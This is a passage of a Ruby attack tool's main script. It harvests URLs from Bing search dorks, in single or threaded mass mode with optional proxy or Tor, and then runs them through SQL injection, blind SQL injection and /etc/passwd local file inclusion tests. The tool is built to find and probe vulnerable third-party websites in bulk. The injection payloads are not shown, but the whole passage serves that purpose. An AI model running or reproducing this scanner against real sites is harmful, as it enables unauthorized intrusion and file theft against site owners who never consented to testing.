		puts "Results files all updated".green + "!".yellow
		puts
		puts
		exit 69;
	end
	#help menu		
	opts.on('-h', '--help', "\n\tHelp Menu".yellow) do 
		foobanner = Banner.new
		foobanner.print
		puts
		puts opts #print opts for dumb dumbs
		puts
		exit 69;
	end
end

begin
	foo = ARGV[0] || ARGV[0] = "-h" # If no arguments passed, set to the same as '-h' to show usage menu ;)
	optparse.parse!

	mandatory = [:method] #set mandatory option to ensure dork or file option chosen
	missing = mandatory.select{ |param| options[param].nil? }  #check which options are missing @values, i.e. nil
	if not missing.empty? #If there are missing options print them
		puts "Missing options: ".red + " #{missing.join(', ')}".yellow  
		puts optparse
		exit
	end
rescue OptionParser::InvalidOption, OptionParser::MissingArgument  #catch errors instead of straight exiting
	foo = Clear.new #clear 
	foo.cls #screen
	puts $!.to_s.red # Friendly output when parsing fails from bad options or no options
	puts
	puts optparse #show correct options
	puts
	exit 666;
end

#Now go and do something with our options that are now set...code.....code...code...
foobanner = Banner.new
foobanner.print
Dir.mkdir("results") if not File.directory?("results") #confirm results dir exists, if not create it
if options[:ccode].nil? #Check if Country Code for Geo Dorking Provided or Not so we can search Bing properly
	options[:ccode] = 'no-bounds' 
end
if options[:ip].nil?
	options[:ip] = 'lol'
end
if not options[:proxy] == 1
	@@proxy = 'landofthelost'
else
	if options[:user].nil?
		@@username = 'nada'
	end
	if options[:pass].nil?
		@@password = 'nada'
	end
end
if options[:level].nil?
	@@level = 0
else
	@@level = options[:level].to_i
end
if options[:tor].nil?
	@@tor = 'fuqno'
end
if options[:method] == 1
	if options[:proxy] == 1
		puts "Proxy Support has been enabled".blue + "!".yellow
	end
	puts "Making a Single dork run".blue + ".......".cyan
	foosearch = BingSearch.new
	if options[:ip] == 'lol'
		foosearch.searchq(options[:dork], options[:ccode], 1, nil)
	else
		foosearch.searchq(options[:dork], options[:ccode], 1, options[:ip])
	end
	puts
	fooresults = File.open('results/links.txt', 'r')
	rescount = fooresults.readlines
	puts "Total Number of Unique Testable Links Found: ".blue + "#{rescount.length}".yellow
	puts "#{rescount.join}".green
	puts "\nCheck ".red + "results/links.txt".yellow + " file if you didn't catch everything in the terminal output just now".red + "......".yellow
	puts
elsif options[:method] == 2
	if options[:proxy] == 1
		puts "Proxy Support has been enabled".blue + "!".yellow
	end
	puts "Mass dorking with file option".blue + ".......".cyan
	FileUtils.rm('results/links.txt') if File.exists?('results/links.txt') #remove results file if it exists as we use append mode for file search to keep track of all results

	#Use multi-threading for file options since we are using more than one dork!
	threads = [] #array to hold our threads
	mutex = Mutex.new #Try to keep our threads playing nicely while they run searches
	File.open(options[:file], "r").each do |mass_dork|
		thread = Thread.new do #yeah threads, much faster now!!!!!!!!!!!!!!!!!!
			dork = mass_dork.sub(' ', '%20').chomp #Set current dork so we can build link		
			mutex.synchronize do #so they all do it in sync and not all whacky. We should really wrap this whole thread subsection including the search calls but it slows things down like crazy and so far I have not seen any side affects of not using Mutex (results same using vs not, with difference being significant time savings). Enjoy or re-write it and show me another way thats not so slow :p
				puts "Checking Bing using ".blue + "'".cyan + "#{dork}".yellow + "'".cyan + " hang tight".blue + "....".cyan
			end
			#Call search function with each dork in its own thread :)
			foosearch = BingSearch.new
			if options[:ip] == 'lol' 
				foosearch.searchq(dork, options[:ccode], 2, nil)
			else
				foosearch.searchq(dork, options[:ccode], 2, options[:ip])
			end
		end
		threads << thread #place thread in array for storage
	end
	threads.each { |thread| thread.join } #make sure all threads finished safely before moving on
	mutex.lock #no more changes!

	fooresults = File.open('results/links.txt', 'r')
	rescount = fooresults.readlines
	foobanner = Banner.new
	foobanner.print
	puts "Total Number of Unique Testable Links Found: ".blue + "#{rescount.length}".yellow
	puts "#{rescount.join}".green
	puts "Total Number of Unique Testable Links Found: ".blue + "#{rescount.length}".yellow
	puts "\nCheck ".red + "results/links.txt".yellow + " file if you didn't catch everything in the terminal output just now".red + "......".yellow
	puts
elsif options[:method] == 3
	if options[:proxy] == 1
		puts "Proxy Support has been enabled".blue + "!".yellow
	end
	#Option Added Back in for SQuirmy, say thanks if you use it and like it!!!!!!!!!!!
	puts "Checking for Shared Hosting".blue + "......".cyan
	puts
	foosearch = BingSearch.new
	foosearch.sharedHosting(options[:shared])
end

#Now we send our results through our checks....
regchk = InjectorTest.new

#Run The Basic Single Quote Injection Test
if not @@level.to_i == 1 and not @@level.to_i == 2
	foobanner = Banner.new
	foobanner.print
	if options[:method] == 1 #Single Dork Option
		regchk.quoteTest(1) #1 = write
	elsif options[:method] == 2 #File Based Mass Dork Option
		regchk.quoteTest(2) #2 = append since we will re-use due to fact we are using file system for mass dorking.....
	end
end

#RUn Very Basic BLIND SQL Injection Test
if @@level.to_i == 1 or @@level.to_i == 3 or @@level.to_i == 5
	foobanner = Banner.new
	foobanner.print
	if options[:method] == 1
		regchk.blindTest(1)
	elsif options[:method] == 2
		regchk.blindTest(2)
	end
end

#Run /etc/passwd LFI test
if @@level.to_i == 2 or @@level.to_i == 4 or @@level.to_i == 5
	foobanner = Banner.new
	foobanner.print
	if options[:method] == 1
		regchk.etcTest(1)
	elsif options[:method] == 2
		regchk.etcTest(2)
	end
end

#EOF